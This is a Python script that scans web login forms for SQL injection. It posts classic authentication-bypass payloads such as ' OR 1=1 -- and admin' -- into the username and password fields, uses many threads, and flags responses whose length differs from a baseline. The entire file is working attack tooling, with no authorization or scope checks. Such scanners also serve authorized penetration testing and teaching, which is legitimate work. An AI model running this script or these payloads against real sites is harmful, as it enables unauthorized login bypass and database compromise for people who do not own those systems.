import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# ----------------------------
# CONFIG
# ----------------------------
PAYLOADS = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    "\" OR \"1\"=\"1",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin' --",
]

THREADS = 15


# ----------------------------
# REQUEST
# ----------------------------
def send(url, data):
    try:
        r = requests.post(url, data=data, timeout=5, allow_redirects=True)
        return r.status_code, len(r.text), r.text
    except:
        return None, 0, ""


# ----------------------------
# BUILD DATA
# ----------------------------
def build_data(form, user, pwd):
    d = {}
    for inp in form["inputs"]:
        name = inp["name"]
        if not name:
            continue

        if name == form["fields"]["username"]:
            d[name] = user
        elif name == form["fields"]["password"]:
            d[name] = pwd
        else:
            d[name] = inp.get("value", "")

    return d


# ----------------------------
# BASELINE
# ----------------------------
def get_baseline(form):
    print("\n[*] BASELINE REQUEST")
    d = build_data(form, "normaluser", "wrongpass")
    s, l, t = send(form["action"], d)

    print(f"[BASE] Status: {s} | Length: {l}")
    return s, l


# ----------------------------
# TEST PAYLOAD
# ----------------------------
def test_payload(payload, form, base_len):
    findings = []

    # username injection
    d = build_data(form, payload, "test123")
    s, l, _ = send(form["action"], d)

    diff = l - base_len

    print(f"[TEST][USER] {payload} | Status={s} | Len={l} | Diff={diff}")

    if s == 200 and abs(diff) > 50:
        findings.append(("username", payload, l, diff))

    # password injection
    d = build_data(form, "admin", payload)
    s, l, _ = send(form["action"], d)

    diff = l - base_len

    print(f"[TEST][PASS] {payload} | Status={s} | Len={l} | Diff={diff}")

    if s == 200 and abs(diff) > 50:
        findings.append(("password", payload, l, diff))

    return findings


# ----------------------------
# MAIN
# ----------------------------
def run_sqli_scan(form, payloads=PAYLOADS, threads=10):

    base_status, base_len = get_baseline(form)

    print("\n[*] STARTING TESTS...\n")

    findings = []

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(test_payload, p, form, base_len) for p in payloads]

        for future in as_completed(futures):
            res = future.result()

            if res:
                for field, payload, size, diff in res:
                    print("\n" + "="*60)
                    print("[!!!] POSSIBLE SQLi")
                    print(f"Field   : {field}")
                    print(f"Payload : {payload}")
                    print(f"Size    : {size}")
                    print(f"Diff    : {diff}")
                    print("="*60)

                    findings.append((field, payload))

    print(f"\n[+] Total findings: {len(findings)}")
    return findings